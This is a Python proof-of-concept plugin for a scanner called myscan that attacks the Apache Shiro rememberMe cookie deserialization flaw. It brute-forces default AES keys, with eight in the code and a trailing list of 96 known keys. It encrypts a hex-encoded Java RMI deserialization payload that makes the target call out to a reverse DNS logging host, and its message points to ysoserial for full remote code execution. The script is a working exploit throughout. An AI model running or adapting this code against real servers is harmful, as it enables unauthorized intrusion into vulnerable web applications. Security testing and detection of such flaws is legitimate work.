#!/usr/bin/env python3
# @Time    : 2020-06-13
# @Author  : caicai
# @File    : poc_shiro_rce_2019.py


import binascii
import uuid
import base64
from Crypto.Cipher import AES
import struct
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.base import PocBase
from myscan.lib.core.common_reverse import generate, query_reverse
from myscan.lib.core.common import get_random_str
from myscan.lib.core.threads import mythread
from myscan.lib.core.data import cmd_line_options


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "shiro_rce"
        self.querykeys = {}
        self.vulmsg = "key can brute,you can use ysoserial to setup a JRMPServer to rce."
        self.level = 2  # 0:Low  1:Medium 2:High
        self.shirokyes = (
            "kPH+bIxk5D2deZiIxcaaaA==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "25BsmdYwjnfcWmnhAciDDg==",
        )

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        self.parse = dictdata_parser(self.dictdata)
        self.maxkey = self.parse.getrootpath() + self.name
        set_cookie = self.dictdata.get("response").get("headers").get("Set-Cookie", None)
        if set_cookie is not None and "rememberMe=deleteMe" in set_cookie:
            # 一个站点只测试一次，无论成功与否
            if not self.can_output(self.maxkey):
                return
            # 做过了一次，此ip:port将不会再做
            self.can_output(self.maxkey, True)
            # send key to enum
            mythread(self.send_poc, self.shirokyes, cmd_line_options.threads)
            # query from reverse_dnslog
            sleep = True
            for querykey, shirokey in self.querykeys.items():
                res, resdata = query_reverse(querykey, sleep)
                sleep = False
                if res:
                    self.result.append({
                        "name": self.name,
                        "url": self.parse.getfilepath(),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "key": shirokey,
                            "request": self.parse.getrequestraw(),
                            "response": self.parse.getresponseraw()
                        }
                    })
                    break
            if self.result == []:
                self.result.append({
                    "name": "shiro found",
                    "url": self.parse.getfilepath(),
                    "level": 0,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": "found shiro and brute key is failed. maybe the web server can't access dnslog ,try others tools .",
                        "request": self.parse.getrequestraw(),
                        "response": self.parse.getresponseraw()
                    }
                })
            # self.can_output(self.maxkey, True)

    def encode_rememberme(self, domain, shirokey):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = base64.b64decode(shirokey)
        iv = uuid.uuid4().bytes
        encryptor = AES.new(key, AES.MODE_CBC, iv)

        file_body = pad(self.get_ysoserial_data(domain))
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
        return base64_ciphertext

    def get_ysoserial_data(self, domain):
        data = "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707751000a556e696361737452656600"
        # data += hex(len(domain))[2:]
        data += ''.join(['%02X' % b for b in struct.pack('>B', len(domain))]).lower()
        data += binascii.b2a_hex(domain.encode()).decode()
        data += "0000"
        data += "ffe7"
        data += "9431fb80"
        data += "00000000000000000000000000000078"
        return bytes(bytearray.fromhex(data) + b"\t\t\t\t\t\t\t\t\t")

    def send_poc(self, shirokey):
        _, hexdata = generate(get_random_str(6), "dns")
        self.querykeys[hexdata] = shirokey
        cookie = "rememberMe={}".format(self.encode_rememberme(hexdata, shirokey))
        req = self.parse.generaterequest({
            "headers": {
                "Cookie": cookie
            }
        })
        r = request(**req)


'''
top 96 key:

kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
0AvVhmFLUs0KTA3Kprsdag==
1AvVhdsgUs0FSA3SDFAdag==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0FSA3SDFAdag==
3AvVhmFLUs0KTA3Kprsdag==
3JvYhmBLUs0ETA5Kprsdag==
r0e3c16IdVkouZgk1TKVMg==
5aaC5qKm5oqA5pyvAAAAAA==
5AvVhmFLUs0KTA3Kprsdag==
6AvVhmFLUs0KTA3Kprsdag==
6NfXkC7YVCV5DASIrEm1Rg==
6ZmI6I2j5Y+R5aSn5ZOlAA==
cmVtZW1iZXJNZQAAAAAAAA==
7AvVhmFLUs0KTA3Kprsdag==
8AvVhmFLUs0KTA3Kprsdag==
8BvVhmFLUs0KTA3Kprsdag==
9AvVhmFLUs0KTA3Kprsdag==
OUHYQzxQ/W9e/UjiAGu6rg==
a3dvbmcAAAAAAAAAAAAAAA==
aU1pcmFjbGVpTWlyYWNsZQ==
bWljcm9zAAAAAAAAAAAAAA==
bWluZS1hc3NldC1rZXk6QQ==
bXRvbnMAAAAAAAAAAAAAAA==
ZUdsaGJuSmxibVI2ZHc9PQ==
wGiHplamyXlVB11UXWol8g==
U3ByaW5nQmxhZGUAAAAAAA==
MTIzNDU2Nzg5MGFiY2RlZg==
L7RioUULEFhRyxM7a2R/Yg==
a2VlcE9uR29pbmdBbmRGaQ==
WcfHGU25gNnTxTlmJMeSpw==
OY//C4rhfwNxCQAQCrQQ1Q==
5J7bIJIV0LQSN3c9LPitBQ==
f/SY5TIve5WWzT4aQlABJA==
bya2HkYo57u6fWh5theAWw==
WuB+y2gcHRnY2Lg9+Aqmqg==
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
3qDVdLawoIr1xFd6ietnwg==
YI1+nBV//m7ELrIyDHm6DQ==
6Zm+6I2j5Y+R5aS+5ZOlAA==
2A2V+RFLUs+eTA3Kpr+dag==
6ZmI6I2j3Y+R1aSn5BOlAA==
SkZpbmFsQmxhZGUAAAAAAA==
2cVtiE83c4lIrELJwKGJUw==
fsHspZw/92PrS3XrPW+vxw==
XTx6CKLo/SdSgub+OPHSrw==
sHdIjUN6tzhl8xZMG3ULCQ==
O4pdf+7e+mZe8NyxMTPJmQ==
HWrBltGvEZc14h9VpMvZWw==
rPNqM6uKFCyaL10AK51UkQ==
Y1JxNSPXVwMkyvES/kJGeQ==
lT2UvDUmQwewm6mMoiw4Ig==
MPdCMZ9urzEA50JDlDYYDg==
xVmmoltfpb8tTceuT5R7Bw==
c+3hFGPjbgzGdrC+MHgoRQ==
ClLk69oNcA3m+s0jIMIkpg==
Bf7MfkNR0axGGptozrebag==
1tC/xrDYs8ey+sa3emtiYw==
ZmFsYWRvLnh5ei5zaGlybw==
cGhyYWNrY3RmREUhfiMkZA==
IduElDUpDDXE677ZkhhKnQ==
yeAAo1E8BOeAYfBlm4NG9Q==
cGljYXMAAAAAAAAAAAAAAA==
2itfW92XazYRi5ltW0M2yA==
XgGkgqGqYrix9lI6vxcrRw==
ertVhmFLUs0KTA3Kprsdag==
5AvVhmFLUS0ATA4Kprsdag==
s0KTA3mFLUprK4AvVhsdag==
hBlzKg78ajaZuTE0VLzDDg==
9FvVhtFLUs0KnA3Kprsdyg==
d2ViUmVtZW1iZXJNZUtleQ==
yNeUgSzL/CfiWw1GALg6Ag==
NGk/3cQ6F5/UNPRh8LpMIg==
4BvVhmFLUs0KTA3Kprsdag==
MzVeSkYyWTI2OFVLZjRzZg==
empodDEyMwAAAAAAAAAAAA==
A7UzJgh1+EWj5oBFi+mSgw==
c2hpcm9fYmF0aXMzMgAAAA==
i45FVt72K2kLgvFrJtoZRw==
U3BAbW5nQmxhZGUAAAAAAA==
ZnJlc2h6Y24xMjM0NTY3OA==
Jt3C93kMR9D5e8QzwfsiMw==
MTIzNDU2NzgxMjM0NTY3OA==
vXP33AonIp9bFwGl7aT7rA==
V2hhdCBUaGUgSGVsbAAAAA==
Q01TX0JGTFlLRVlfMjAxOQ==
ZAvph3dsQs0FSL3SDFAdag==
Is9zJ3pzNh2cgTHB4ua3+Q==
NsZXjXVklWPZwOfkvk6kUA==
GAevYnznvgNCURavBhCr1w==
66v1O8keKNV3TTcGPK1wzg==
SDKOLKn2J1j/2BHjeZwAoQ=='''
